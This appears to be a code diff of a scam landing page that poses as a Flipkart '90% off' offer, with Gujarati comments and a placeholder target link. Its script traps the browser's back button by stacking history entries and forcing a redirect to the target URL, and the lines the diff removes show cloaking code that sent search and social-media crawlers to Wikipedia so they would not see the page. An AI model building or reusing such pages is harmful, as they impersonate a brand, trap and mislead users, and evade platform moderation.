@@ -12,7 +12,7 @@
             overflow: hidden;
         }
 
-        /* Floating Logos */
+        /* Floating Logos Background */
         @keyframes float {
             0% { transform: translate(0, 0) rotate(0deg); }
             50% { transform: translate(50px, 50px) rotate(180deg); }
@@ -23,26 +23,53 @@
         }
 
         .container { text-align: center; z-index: 10; position: relative; width: 100%; }
-        .deal-text { font-size: 22px; font-weight: bold; color: #ffffff; margin-bottom: 20px; text-transform: uppercase; }
 
+        /* બટનની ઉપરનું લખાણ */
+        .top-text { 
+            font-size: 24px; 
+            font-weight: bold; 
+            color: #ffffff; 
+            margin-bottom: 15px; 
+            text-transform: uppercase;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.2);
+        }
+
+        /* ધ્રૂજતું એનિમેશન */
         @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-4px); }
-            50% { transform: translateX(4px); }
-            75% { transform: translateX(-4px); }
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
         }
 
-        .oval-button {
-            background-color: #ffe11b; color: #212121;
-            padding: 15px 55px; font-weight: bold; border: none;
-            border-radius: 50px; cursor: pointer;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
-            animation: shake 0.5s infinite; display: inline-block;
+        /* ફ્લિપકાર્ટ સ્ટાઇલ પીળું બટન */
+        .flipkart-button {
+            background-color: #ffe11b; /* Flipkart Yellow */
+            color: #212121;
+            padding: 20px 60px;
+            border: none;
+            border-radius: 8px; /* Standard Button Shape */
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            display: inline-block;
             text-decoration: none;
+            transition: transform 0.2s;
+            animation: shake 1s infinite;
         }
 
-        .offer-text { font-size: 26px; display: block; line-height: 1.2; }
-        .click-Here-text { font-size: 14px; display: block; margin-top: 4px; color: #333; font-weight: normal; }
+        .offer-text { 
+            font-size: 28px; 
+            font-weight: 900; 
+            display: block; 
+            line-height: 1;
+        }
+
+        .click-here-text { 
+            font-size: 16px; 
+            display: block; 
+            margin-top: 5px; 
+            font-weight: bold;
+            color: #000;
+            opacity: 0.8;
+        }
     </style>
 </head>
 <body onclick="activateHijack()" ontouchstart="activateHijack()">
@@ -52,25 +79,18 @@
     <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:40%; left:80%; animation: float 18s infinite linear;">
 
     <div class="container">
-        <div class="deal-text">ધમાકેદાર ઓફર!</div>
-        <a href="https://તમારી-લિંક-અહીં-મૂકો.com" class="oval-button" id="mainButton">
-            <span class="offer-text">UP To 90% Off</span>
-            <span class="click-Here-text">Click Here</span>
+        <div class="top-text">Claim your deal</div>
+        
+        <a href="https://તમારી-લિંક-અહીં-મૂકો.com" class="flipkart-button" id="mainButton">
+            <span class="offer-text">Up To 90% Off</span>
+            <span class="click-here-text">Click Here</span>
         </a>
     </div>
 
     <script>
-        // --- સેટિંગ્સ ---
-        var targetUrl = "https://તમારી-લિંક-અહીં-મૂકો.com"; // તમારી ફાઈનલ લિંક અહીં નાખો
+        var targetUrl = "https://તમારી-લિંક-અહીં-મૂકો.com"; 
 
-        // --- બોટ પ્રોટેક્શન (Client-side) ---
-        var ua = navigator.userAgent.toLowerCase();
-        var bots = ["googlebot", "bingbot", "facebot", "facebookexternalhit", "twitterbot"];
-        if (bots.some(bot => ua.includes(bot))) {
-            window.location.replace("https://www.wikipedia.org");
-        }
-
-        // --- બેક બટન હાઇજેક (Back Button Trap) ---
+        // બેક બટન હાઇજેક
         function activateHijack() {
             for(var i=0; i<10; i++) {
                 window.history.pushState(null, null, window.location.href);
@@ -79,14 +99,11 @@
 
         window.onload = function() {
             window.history.pushState(null, null, window.location.href);
-            
             window.onpopstate = function(event) {
-                // જો કોઈ બેક દબાવે તો સીધું ટાર્ગેટ લિંક પર મોકલો
                 window.location.replace(targetUrl);
             };
         };
 
-        // બટન પર ક્લિક કરવાથી પણ રીડાયરેક્ટ થશે
         document.getElementById("mainButton").onclick = function(e) {
             e.preventDefault();
             window.location.replace(targetUrl);
